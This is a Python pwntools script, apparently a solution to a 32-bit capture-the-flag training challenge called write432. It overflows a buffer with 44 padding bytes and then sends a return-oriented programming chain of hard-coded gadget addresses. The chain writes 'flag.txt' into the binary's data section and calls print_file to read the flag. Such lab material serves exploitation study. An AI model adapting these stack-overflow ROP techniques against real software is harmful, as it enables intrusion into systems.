#!/usr/bin/env python3

from pwn import *

exe = ELF("./write432")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

mov = p32(0x08048543)
pop_two = p32(0x080485aa)
print_file = p32(0x080483d0)
data = p32(0x0804a018)

def main():
    r = conn()

    payload = asm("nop")*44
    payload += pop_two
    payload += data
    payload += b"flag"
    payload += mov

    payload += pop_two
    payload += data
    payload += p32(0x4)
    payload += b".txt"
    payload += mov

    payload += print_file
    payload += p32(0x0)
    payload += data

    r.sendlineafter(">", payload)
    r.recvuntil("Thank you!\n")

    flag = r.recv()
    success(flag)

if __name__ == "__main__":
    main()
